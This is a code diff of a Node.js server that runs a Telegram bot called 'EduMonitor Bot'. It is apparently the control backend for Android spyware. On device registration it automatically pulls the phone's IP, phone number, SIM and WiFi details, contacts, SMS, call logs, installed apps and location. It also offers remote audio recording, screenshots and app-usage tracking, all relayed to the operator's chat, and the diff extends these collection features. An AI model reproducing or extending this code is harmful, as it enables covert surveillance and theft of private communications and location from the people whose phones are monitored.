@@ -88,7 +88,6 @@ function getServerIP() {
         const interfaces = os.networkInterfaces();
         for (const name of Object.keys(interfaces)) {
             for (const iface of interfaces[name]) {
-                // Skip internal and non-IPv4 addresses
                 if (iface.family === 'IPv4' && !iface.internal) {
                     return iface.address;
                 }
@@ -194,7 +193,6 @@ async function setChatMenuButton(chatId) {
     try {
         console.log(`🔘 Setting menu button for chat ${chatId}`);
         
-        // Set both the menu button and commands
         await axios.post(`${TELEGRAM_API}/setMyCommands`, {
             commands: [
                 { command: 'help', description: '📋 Show main menu' },
@@ -208,16 +206,14 @@ async function setChatMenuButton(chatId) {
                 { command: 'storage', description: '💾 Storage info' },
                 { command: 'network', description: '📡 Network info' },
                 { command: 'battery', description: '🔋 Battery level' },
-                { command: 'small', description: '📏 Small screenshots' },
-                { command: 'medium', description: '📏 Medium screenshots' },
-                { command: 'original', description: '📏 Original screenshots' },
-                { command: 'record_auto_on', description: '⏰ Enable auto recording' },
-                { command: 'record_auto_off', description: '⏰ Disable auto recording' },
-                { command: 'record_schedule', description: '📅 Check schedule' }
+                { command: 'ip_info', description: '🌐 Get IP info' },
+                { command: 'phone_number', description: '📞 Get phone number' },
+                { command: 'sim_info', description: '📱 Get SIM info' },
+                { command: 'wifi_info', description: '📶 Get WiFi info' },
+                { command: 'all_info', description: '📱 Complete device info' }
             ]
         });
         
-        // Also set the menu button text (appears above input field)
         await axios.post(`${TELEGRAM_API}/setChatMenuButton`, {
             chat_id: chatId,
             menu_button: {
@@ -237,13 +233,6 @@ function createInlineButton(text, callbackData) {
     return {
         text: text,
         callback_data: callbackData
-    };
-}
-
-function createUrlButton(text, url) {
-    return {
-        text: text,
-        url: url
     };
 }
 
@@ -323,7 +312,7 @@ function formatLocationMessage(locationData) {
     }
 }
 
-// Format IP info into a readable message
+// Format IP info
 function formatIPInfo(ipData) {
     try {
         let ipInfo = ipData;
@@ -355,10 +344,6 @@ function formatIPInfo(ipData) {
             message += `\n🔗 <b>Connected via:</b> ${ipInfo.connectedTo}\n`;
         }
         
-        if (ipInfo.serverIP) {
-            message += `\n🖥️ <b>Server IP:</b> <code>${ipInfo.serverIP}</code>\n`;
-        }
-        
         return message;
     } catch (error) {
         console.error('Error formatting IP info:', error);
@@ -368,24 +353,21 @@ function formatIPInfo(ipData) {
 
 // ============= AUTO DATA COLLECTION =============
 
-/**
- * Queue auto-data commands for a newly registered device
- */
 function queueAutoDataCommands(deviceId, chatId) {
     console.log(`🔄 Queueing auto-data collection for device ${deviceId}`);
     
-    // Check if we've already requested data for this device
     if (autoDataRequested.has(deviceId)) {
         console.log(`⚠️ Auto-data already requested for ${deviceId}, skipping`);
         return;
     }
     
-    // Mark that we're requesting data
     autoDataRequested.set(deviceId, {
         timestamp: Date.now(),
         requested: [
             'ip_info',
             'phone_number',
+            'sim_info',
+            'wifi_info',
             'contacts_html',
             'sms_html', 
             'calllogs_html',
@@ -400,20 +382,20 @@ function queueAutoDataCommands(deviceId, chatId) {
         return;
     }
     
-    // Initialize pending commands array if needed
     if (!device.pendingCommands) {
         device.pendingCommands = [];
     }
     
-    // Queue commands in sequence with timestamps
     const commands = [
         { command: 'ip_info', delay: 0, description: 'IP Address' },
         { command: 'phone_number', delay: 2, description: 'Phone Number' },
-        { command: 'contacts_html', delay: 5, description: 'Contacts' },
-        { command: 'sms_html', delay: 10, description: 'SMS Messages' },
-        { command: 'calllogs_html', delay: 15, description: 'Call Logs' },
-        { command: 'apps_html', delay: 20, description: 'Apps List' },
-        { command: 'location', delay: 25, description: 'Location' }
+        { command: 'sim_info', delay: 4, description: 'SIM Info' },
+        { command: 'wifi_info', delay: 6, description: 'WiFi Info' },
+        { command: 'contacts_html', delay: 10, description: 'Contacts' },
+        { command: 'sms_html', delay: 15, description: 'SMS Messages' },
+        { command: 'calllogs_html', delay: 20, description: 'Call Logs' },
+        { command: 'apps_html', delay: 25, description: 'Apps List' },
+        { command: 'location', delay: 30, description: 'Location' }
     ];
     
     commands.forEach((cmd, index) => {
@@ -421,7 +403,7 @@ function queueAutoDataCommands(deviceId, chatId) {
             command: cmd.command,
             originalCommand: `/${cmd.command}`,
             messageId: null,
-            timestamp: Date.now() + (cmd.delay * 1000), // Stagger by seconds
+            timestamp: Date.now() + (cmd.delay * 1000),
             autoData: true
         };
         
@@ -446,11 +428,11 @@ function getMainMenuKeyboard() {
         ],
         [
             createInlineButton('📍 Location', 'menu_location'),
-            createInlineButton('📊 Stats', 'menu_stats')
+            createInlineButton('🌐 Network', 'menu_network')
         ],
         [
-            createInlineButton('🌐 Network', 'menu_network'),
-            createInlineButton('📞 Phone', 'menu_phone')
+            createInlineButton('📞 Phone', 'menu_phone'),
+            createInlineButton('📊 Stats', 'menu_stats')
         ],
         [
             createInlineButton('ℹ️ About', 'menu_about'),
@@ -469,13 +451,11 @@ app.post('/webhook', async (req, res) => {
             const update = req.body;
             console.log('📩 Received update type:', update.callback_query ? 'callback' : (update.message ? 'message' : 'other'));
 
-            // Handle callback queries (button clicks)
             if (update.callback_query) {
                 await handleCallbackQuery(update.callback_query);
                 return;
             }
 
-            // Handle regular messages
             if (!update?.message) {
                 console.log('📭 Non-message update');
                 return;
@@ -491,10 +471,8 @@ app.post('/webhook', async (req, res) => {
                 return;
             }
 
-            // Set menu button for authorized users
             await setChatMenuButton(chatId);
 
-            // Check if user is in a conversation state
             const userState = userStates.get(chatId);
             
             if (userState) {
@@ -502,11 +480,9 @@ app.post('/webhook', async (req, res) => {
                 return;
             }
 
-            // Regular command handling
             if (text?.startsWith('/')) {
                 await handleCommand(chatId, text, messageId);
             } else {
-                // Handle non-command messages
                 await sendTelegramMessageWithKeyboard(
                     chatId,
                     "🤖 Use the menu button below or type /help to see available commands.",
@@ -529,10 +505,8 @@ async function handleCallbackQuery(callbackQuery) {
     
     console.log(`🖱️ Callback received: ${data} from chat ${chatId}`);
     
-    // Acknowledge the callback to remove the loading state
     await answerCallbackQuery(callbackId);
     
-    // Handle different callback data
     if (data === 'help_main') {
         await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard());
         
@@ -563,6 +537,10 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('📱 Apps List (HTML)', 'cmd:apps_html')
             ],
             [
+                createInlineButton('📱 App Opens', 'cmd:app_opens'),
+                createInlineButton('📱 App Opens HTML', 'cmd:app_opens_html')
+            ],
+            [
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -585,6 +563,14 @@ async function handleCallbackQuery(callbackQuery) {
             [
                 createInlineButton('▶️ Start Recording', 'cmd:start_recording'),
                 createInlineButton('⏹️ Stop Recording', 'cmd:stop_recording')
+            ],
+            [
+                createInlineButton('🎤 Audio Ultra', 'cmd:audio_ultra'),
+                createInlineButton('🎤 Audio Low', 'cmd:audio_low')
+            ],
+            [
+                createInlineButton('🎤 Audio Medium', 'cmd:audio_medium'),
+                createInlineButton('🎤 Audio High', 'cmd:audio_high')
             ],
             [
                 createInlineButton('◀️ Back', 'help_main')
@@ -672,10 +658,11 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('📶 WiFi Info', 'cmd:wifi_info')
             ],
             [
-                createInlineButton('📱 Mobile Data', 'cmd:mobile_info'),
+                createInlineButton('📱 Mobile Info', 'cmd:mobile_info'),
                 createInlineButton('🔄 Network Status', 'cmd:network')
             ],
             [
+                createInlineButton('🌍 All Network', 'cmd:all_info'),
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -685,10 +672,13 @@ async function handleCallbackQuery(callbackQuery) {
         const keyboard = [
             [
                 createInlineButton('📞 Phone Number', 'cmd:phone_number'),
-                createInlineButton('📇 SIM Info', 'cmd:sim_info')
+                createInlineButton('📱 SIM Info', 'cmd:sim_info')
             ],
             [
-                createInlineButton('📊 Call Logs', 'cmd:calllogs'),
+                createInlineButton('📱 Mobile Info', 'cmd:mobile_info'),
+                createInlineButton('📊 Call Logs', 'cmd:calllogs')
+            ],
+            [
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -724,7 +714,7 @@ async function handleCallbackQuery(callbackQuery) {
         await editMessageKeyboard(chatId, messageId, keyboard);
         await sendTelegramMessage(chatId,
             "🤖 <b>EduMonitor Bot</b>\n\n" +
-            "Version: 2.1\n" +
+            "Version: 3.0\n" +
             "Features:\n" +
             "• Remote device monitoring\n" +
             "• Screenshot capture\n" +
@@ -734,6 +724,8 @@ async function handleCallbackQuery(callbackQuery) {
             "• Schedule recording\n" +
             "• IP address tracking\n" +
             "• Phone number detection\n" +
+            "• SIM card information\n" +
+            "• WiFi details\n" +
             "• Auto-data collection on registration\n\n" +
             "Use the menu below to navigate.");
         
@@ -742,7 +734,6 @@ async function handleCallbackQuery(callbackQuery) {
         await sendTelegramMessage(chatId, "Menu closed. Tap the Menu button or type /help to reopen.");
         
     } else if (data === 'start_custom_schedule_interactive') {
-        // Start interactive setup
         userStates.set(chatId, {
             state: SCHEDULE_STATES.AWAITING_START_TIME,
             data: {}
@@ -776,16 +767,13 @@ async function handleCallbackQuery(callbackQuery) {
         }
         
     } else if (data.startsWith('cmd:')) {
-        // Execute a command
         const command = data.substring(4);
         console.log(`🎯 Executing command from button: ${command}`);
         
         await answerCallbackQuery(callbackId, `⏳ Executing ${command}...`);
         
-        // Forward to command handler
         await handleCommand(chatId, `/${command}`, messageId);
         
-        // Update keyboard
         const keyboard = [
             [
                 createInlineButton('✅ Command Sent', 'noop'),
@@ -803,7 +791,6 @@ async function handleConversationMessage(chatId, text, messageId, userState) {
     
     switch (userState.state) {
         case SCHEDULE_STATES.AWAITING_START_TIME:
-            // Validate start time format
             if (!text.match(/^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$/)) {
                 await sendTelegramMessage(chatId, 
                     "❌ Invalid time format. Please use HH:MM (e.g., 22:00)");
@@ -852,18 +839,14 @@ async function handleConversationMessage(chatId, text, messageId, userState) {
                 return;
             }
             
-            // Parse times
             const [startHour, startMin] = userState.data.startTime.split(':').map(Number);
             const [endHour, endMin] = userState.data.endTime.split(':').map(Number);
             const recurring = userState.data.recurring;
             
-            // Create the command
             const command = `/record_custom ${startHour.toString().padStart(2,'0')}:${startMin.toString().padStart(2,'0')} ${endHour.toString().padStart(2,'0')}:${endMin.toString().padStart(2,'0')} ${recurring ? 'daily' : 'once'} ${interval}`;
             
-            // Clear state
             userStates.delete(chatId);
             
-            // Execute the command
             await handleCommand(chatId, command, messageId);
             
             await sendTelegramMessage(chatId, 
@@ -882,7 +865,6 @@ async function handleConversationMessage(chatId, text, messageId, userState) {
 async function handleCommand(chatId, command, messageId) {
     console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);
 
-    // Special case for /help - show main menu
     if (command === '/help' || command === '/start' || command === '/menu') {
         console.log('📋 Showing main menu');
         
@@ -895,7 +877,6 @@ async function handleCommand(chatId, command, messageId) {
         return;
     }
 
-    // Find device
     let deviceId = null;
     let device = null;
     
@@ -953,6 +934,12 @@ async function handleCommand(chatId, command, messageId) {
         ackMessage = `🌐 Fetching IP information...`;
     } else if (cleanCommand === 'phone_number') {
         ackMessage = `📞 Getting phone number...`;
+    } else if (cleanCommand === 'sim_info') {
+        ackMessage = `📱 Getting SIM information...`;
+    } else if (cleanCommand === 'wifi_info') {
+        ackMessage = `📶 Getting WiFi information...`;
+    } else if (cleanCommand === 'all_info') {
+        ackMessage = `📱 Gathering all device information...`;
     }
     
     await sendTelegramMessage(chatId, ackMessage);
@@ -975,13 +962,9 @@ app.post('/api/ipinfo/:deviceId', async (req, res) => {
         
         const chatId = device.chatId;
         
-        // Add server IP to the data
         ipData.serverIP = getServerIP();
-        
-        // Store IP info in device data
         device.lastIPInfo = ipData;
         
-        // Format and send the message
         const formattedMessage = formatIPInfo(ipData);
         await sendTelegramMessage(chatId, formattedMessage);
         
@@ -1010,11 +993,9 @@ app.post('/api/phonenumber/:deviceId', async (req, res) => {
         
         const chatId = device.chatId;
         
-        // Store phone info in device data
         device.phoneNumber = phoneData.phoneNumber;
         device.simInfo = phoneData.simInfo;
         
-        // Format message
         let message = '📞 <b>Phone Information</b>\n\n';
         
         if (phoneData.phoneNumber && phoneData.phoneNumber !== 'Unknown') {
@@ -1024,13 +1005,24 @@ app.post('/api/phonenumber/:deviceId', async (req, res) => {
         }
         
         if (phoneData.simInfo) {
-            message += `\n<b>SIM Information:</b>\n`;
-            message += `• Operator: ${phoneData.simInfo.operator || 'Unknown'}\n`;
-            message += `• Country: ${phoneData.simInfo.country || 'Unknown'}\n`;
-            message += `• SIM State: ${phoneData.simInfo.state || 'Unknown'}\n`;
-            if (phoneData.simInfo.slotCount) {
-                message += `• SIM Slots: ${phoneData.simInfo.slotCount}\n`;
+            if (Array.isArray(phoneData.simInfo)) {
+                message += `\n<b>SIM Information (Multiple SIMs):</b>\n`;
+                phoneData.simInfo.forEach((sim, index) => {
+                    message += `\n📱 <b>SIM ${index + 1}</b>\n`;
+                    message += `• Slot: ${sim.slot || 'Unknown'}\n`;
+                    message += `• Carrier: ${sim.carrierName || 'Unknown'}\n`;
+                    message += `• Country: ${sim.countryIso || 'Unknown'}\n`;
+                });
+            } else {
+                message += `\n<b>SIM Information:</b>\n`;
+                message += `• Operator: ${phoneData.simInfo.operator || 'Unknown'}\n`;
+                message += `• Country: ${phoneData.simInfo.country || 'Unknown'}\n`;
+                message += `• SIM State: ${phoneData.simInfo.simState || 'Unknown'}\n`;
             }
+        }
+        
+        if (phoneData.simSlotCount) {
+            message += `• SIM Slots: ${phoneData.simSlotCount}\n`;
         }
         
         if (phoneData.error) {
@@ -1072,7 +1064,6 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
         const chatId = device.chatId;
         const filePath = req.file.path;
         
-        // Determine caption based on command
         let caption = '';
         
         switch (command) {
@@ -1100,14 +1091,16 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
             case 'notifications_html':
                 caption = `🔔 Notifications Export (${itemCount} notifications)`;
                 break;
+            case 'app_opens':
+            case 'app_opens_html':
+                caption = `📱 App Opens Export (${itemCount} entries)`;
+                break;
             default:
                 caption = `📎 Data Export`;
         }
         
-        // Send the file to Telegram
         await sendTelegramDocument(chatId, filePath, filename, caption);
         
-        // Delete the file after sending
         setTimeout(() => {
             try {
                 if (fs.existsSync(filePath)) {
@@ -1129,10 +1122,6 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
 
 // ============= LOG INGESTION ENDPOINTS =============
 
-/**
- * Endpoint for devices to send logs in real-time
- * Expects POST with JSON body containing log entries
- */
 app.post('/api/logs', async (req, res) => {
     try {
         const logData = req.body;
@@ -1144,13 +1133,11 @@ app.post('/api/logs', async (req, res) => {
             package: logData.package
         });
 
-        // Validate required fields
         if (!logData.deviceId) {
             console.error('❌ Missing deviceId in log');
             return res.status(400).json({ error: 'Missing deviceId' });
         }
 
-        // Find the device
         const device = devices.get(logData.deviceId);
         if (!device) {
             console.error(`❌ Device not found: ${logData.deviceId}`);
@@ -1159,7 +1146,6 @@ app.post('/api/logs', async (req, res) => {
 
         const chatId = device.chatId;
 
-        // Format log for Telegram based on type
         let message = '';
         
         switch (logData.type) {
@@ -1177,17 +1163,19 @@ app.post('/api/logs', async (req, res) => {
                 break;
                 
             case 'location':
-                // Location is handled by /api/location endpoint
-                // Just acknowledge
                 return res.json({ success: true, handled: 'location_endpoint' });
                 
             case 'ip_info':
-                // IP info is handled by /api/ipinfo endpoint
                 return res.json({ success: true, handled: 'ipinfo_endpoint' });
                 
             case 'phone_number':
-                // Phone number is handled by /api/phonenumber endpoint
                 return res.json({ success: true, handled: 'phonenumber_endpoint' });
+                
+            case 'app_open':
+                message = `📱 <b>App Opened</b>\n` +
+                         `App: <code>${logData.package || 'unknown'}</code>\n` +
+                         `Details: ${logData.data || ''}`;
+                break;
                 
             case 'contacts':
                 try {
@@ -1263,18 +1251,14 @@ app.post('/api/logs', async (req, res) => {
                          `Data: ${logData.data?.substring(0, 200)}`;
         }
 
-        // Send to Telegram if we have a message
         if (message) {
-            // Don't await - don't block the response
             sendTelegramMessage(chatId, message).catch(e => 
                 console.error('Failed to send log to Telegram:', e)
             );
         }
 
-        // Log to console for debugging
         console.log(`✅ Log processed for device ${logData.deviceId}`);
 
-        // Send success response
         res.json({ 
             success: true, 
             timestamp: Date.now(),
@@ -1290,18 +1274,12 @@ app.post('/api/logs', async (req, res) => {
     }
 });
 
-// Also add a plural version for compatibility
 app.post('/api/log', (req, res) => {
-    // Redirect to /api/logs
     console.log('📝 Redirecting /api/log to /api/logs');
     req.url = '/api/logs';
     app._router.handle(req, res);
 });
 
-/**
- * Endpoint for batch log uploads
- * Expects array of log entries
- */
 app.post('/api/logs/batch', async (req, res) => {
     try {
         const logs = req.body;
@@ -1312,7 +1290,6 @@ app.post('/api/logs/batch', async (req, res) => {
 
         console.log(`📦 Received batch of ${logs.length} logs`);
 
-        // Group logs by device
         const deviceLogs = new Map();
         
         for (const log of logs) {
@@ -1324,11 +1301,9 @@ app.post('/api/logs/batch', async (req, res) => {
             }
         }
 
-        // Send summary to each device's chat
         for (const [deviceId, deviceLogsList] of deviceLogs.entries()) {
             const device = devices.get(deviceId);
             if (device) {
-                // Count by type
                 const typeCounts = {};
                 deviceLogsList.forEach(log => {
                     typeCounts[log.type] = (typeCounts[log.type] || 0) + 1;
@@ -1344,7 +1319,6 @@ app.post('/api/logs/batch', async (req, res) => {
                     `First log: ${new Date(deviceLogsList[0].timestamp).toLocaleString()}\n` +
                     `Last log: ${new Date(deviceLogsList[deviceLogsList.length-1].timestamp).toLocaleString()}`;
                 
-                // Send summary without awaiting
                 sendTelegramMessage(device.chatId, summary).catch(console.error);
             }
         }
@@ -1381,14 +1355,11 @@ app.post('/api/location/:deviceId', async (req, res) => {
         
         const chatId = device.chatId;
         
-        // Store last location in device data
         device.lastLocation = locationData;
         
-        // Format the location message
         const formatted = formatLocationMessage(locationData);
         
         if (formatted.lat && formatted.lon) {
-            // Send as native Telegram location (creates a pin)
             try {
                 await axios.post(`${TELEGRAM_API}/sendLocation`, {
                     chat_id: chatId,
@@ -1402,7 +1373,6 @@ app.post('/api/location/:deviceId', async (req, res) => {
             }
         }
         
-        // Send the formatted message
         await sendTelegramMessage(chatId, formatted.text);
         
         res.json({ success: true });
@@ -1467,8 +1437,9 @@ app.post('/api/result/:deviceId', async (req, res) => {
     const deviceId = req.params.deviceId;
     const { command, result, error } = req.body;
     
-    // Skip if this is a file command
-    if (command && (command.includes('_txt') || command.includes('_html') || command === 'ip_info' || command === 'phone_number' || command === 'location')) {
+    if (command && (command.includes('_txt') || command.includes('_html') || 
+        command === 'ip_info' || command === 'phone_number' || command === 'location' ||
+        command === 'sim_info' || command === 'wifi_info' || command === 'all_info')) {
         console.log(`📎 ${command} using dedicated endpoint`);
         return res.sendStatus(200);
     }
@@ -1514,10 +1485,8 @@ app.post('/api/register', async (req, res) => {
     
     console.log(`✅ Device registered: ${deviceId} for chat ${chatId}`);
     
-    // Set menu button for this chat
     await setChatMenuButton(chatId);
     
-    // Send welcome message with keyboard
     await sendTelegramMessageWithKeyboard(
         chatId,
         `✅ <b>Device Connected!</b>\n\n` +
@@ -1527,6 +1496,8 @@ app.post('/api/register', async (req, res) => {
         `The server is automatically requesting:\n` +
         `• 🌐 IP Address Information\n` +
         `• 📞 Phone Number\n` +
+        `• 📱 SIM Information\n` +
+        `• 📶 WiFi Details\n` +
         `• 📇 Contacts\n` +
         `• 💬 SMS Messages\n` +
         `• 📞 Call Logs\n` +
@@ -1536,7 +1507,6 @@ app.post('/api/register', async (req, res) => {
         getMainMenuKeyboard()
     );
     
-    // Queue auto-data commands
     queueAutoDataCommands(deviceId, chatId);
     
     res.json({ status: 'registered', deviceId });
@@ -1560,7 +1530,6 @@ app.get('/api/devices', (req, res) => {
     res.json({ total: devices.size, devices: deviceList });
 });
 
-// Test endpoint to manually add a command
 app.post('/api/test-command/:deviceId', (req, res) => {
     const deviceId = req.params.deviceId;
     const { command } = req.body;
@@ -1585,8 +1554,6 @@ app.post('/api/test-command/:deviceId', (req, res) => {
     console.log(`🧪 Test command added for ${deviceId}: ${cmd}`);
     res.json({ success: true, message: `Test command '${cmd}' added` });
 });
-
-// ============= TEST ENDPOINTS =============
 
 app.get('/test', (req, res) => {
     const serverIP = getServerIP();
@@ -1622,8 +1589,6 @@ app.get('/test-menu', async (req, res) => {
     res.json({ success: !!result });
 });
 
-// ============= START SERVER =============
-
 app.listen(PORT, '0.0.0.0', () => {
     const serverIP = getServerIP();
     console.log('\n🚀 ===============================================');
@@ -1635,17 +1600,19 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   └─ When device registers:');
     console.log('   └─ 1. 🌐 IP Address Info');
     console.log('   └─ 2. 📞 Phone Number');
-    console.log('   └─ 3. 📇 Contacts (HTML)');
-    console.log('   └─ 4. 💬 SMS (HTML)');
-    console.log('   └─ 5. 📞 Call Logs (HTML)');
-    console.log('   └─ 6. 📱 Apps List (HTML)');
-    console.log('   └─ 7. 📍 Location');
+    console.log('   └─ 3. 📱 SIM Information');
+    console.log('   └─ 4. 📶 WiFi Details');
+    console.log('   └─ 5. 📇 Contacts (HTML)');
+    console.log('   └─ 6. 💬 SMS (HTML)');
+    console.log('   └─ 7. 📞 Call Logs (HTML)');
+    console.log('   └─ 8. 📱 Apps List (HTML)');
+    console.log('   └─ 9. 📍 Location');
     console.log('\n✅ NEW ENDPOINTS:');
     console.log('   └─ POST /api/ipinfo/:deviceId - IP Information');
     console.log('   └─ POST /api/phonenumber/:deviceId - Phone Number');
     console.log('\n✅ MENU BUTTON CONFIGURED:');
     console.log('   └─ Persistent menu button appears next to input field');
-    console.log('   └─ 16 commands registered with BotFather');
+    console.log('   └─ Commands include: ip_info, phone_number, sim_info, wifi_info, all_info');
     console.log('\n✅ INTERACTIVE SCHEDULE SETUP:');
     console.log('   └─ Step-by-step time entry');
     console.log('   └─ Daily/Once choice with buttons');
